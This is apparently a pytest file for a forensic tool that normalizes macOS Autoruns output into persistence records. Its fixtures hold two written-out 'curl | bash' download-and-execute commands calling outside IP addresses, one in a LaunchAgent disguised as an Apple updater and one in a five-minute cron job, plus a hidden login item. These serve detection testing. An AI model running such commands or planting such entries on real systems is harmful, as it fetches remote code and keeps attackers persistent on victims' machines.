# SPDX-License-Identifier: GPL-3.0-or-later
"""The real MacOS.Detection.Autoruns artifact maps to macos.persistence docs."""
from raptorscope.normalize.autoruns import normalize_autoruns

HOST = {"name": "mac-victim", "os": {"type": "macos"}}

# Shaped after the real MacOS.Detection.Autoruns output: one artifact, per-source
# rows, nested LaunchdConfig, a file Hash (no flat CodeSignature), cron fields.
ROWS = [
    {
        "Source": "LaunchAgents",
        "OSPath": "/Users/analyst/Library/LaunchAgents/com.apple.updates.plist",
        "Mtime": "2026-06-30T02:41:09Z",
        "Hash": {"SHA256": "abc123"},
        "Disabled": False,
        "LaunchdConfig": {
            "Label": "com.apple.updates",
            "Program": "/bin/bash",
            "ProgramArguments": ["/bin/bash", "-c", "curl -fsSL http://185.220.101.4/x | bash"],
            "RunAtLoad": True,
        },
    },
    {
        "Source": "crontabs",
        "OSPath": "/usr/lib/cron/tabs/analyst",
        "User": "analyst",
        "Mtime": "2026-07-01T18:22:31Z",
        "Minute": "*/5",
        "Hour": "*",
        "DayOfMonth": "*",
        "Month": "*",
        "DayOfWeek": "*",
        "Command": "/bin/bash -c 'curl -fsSL http://45.9.148.99/a | bash'",
    },
    {
        "Source": "Sandboxed Loginitems",
        "OSPath": "/Users/Shared/.updater/SystemUpdater.app",
        "Mtime": "2026-06-29T23:51:02Z",
        "LoginItemConfig": {"Label": "SystemUpdater"},
        "Hidden": True,
    },
]


def _by_type(docs):
    return {d["raptorscope"]["persistence"]["type"]: d for d in docs}


def test_maps_each_source_to_its_persistence_type():
    docs = normalize_autoruns(ROWS, HOST)
    assert len(docs) == 3
    types = _by_type(docs)
    assert set(types) == {"launch_agent", "cron", "login_item"}
    assert all(d["event"]["dataset"] == "macos.persistence" for d in docs)


def test_launch_agent_parses_nested_config_and_hash():
    la = _by_type(normalize_autoruns(ROWS, HOST))["launch_agent"]
    p = la["raptorscope"]["persistence"]
    assert p["label"] == "com.apple.updates"
    assert p["run_at_load"] is True
    assert p["hash"] == "abc123"
    assert p["disabled"] is False
    assert la["process"]["executable"] == "/bin/bash"
    assert "185.220.101.4" in la["process"]["command_line"]
    # Autoruns times are file mtimes — provenance is recorded.
    assert la["raptorscope"]["time"]["source"] == "mtime"
    assert la["@timestamp"] == "2026-06-30T02:41:09Z"


def test_cron_row_carries_schedule_and_command():
    cron = _by_type(normalize_autoruns(ROWS, HOST))["cron"]
    assert cron["raptorscope"]["persistence"]["schedule"] == "*/5 * * * *"
    assert cron["user"]["name"] == "analyst"
    assert "45.9.148.99" in cron["process"]["command_line"]


def test_login_item_from_login_config():
    li = _by_type(normalize_autoruns(ROWS, HOST))["login_item"]
    assert li["raptorscope"]["persistence"]["label"] == "SystemUpdater"
    assert li["raptorscope"]["persistence"]["hidden"] is True
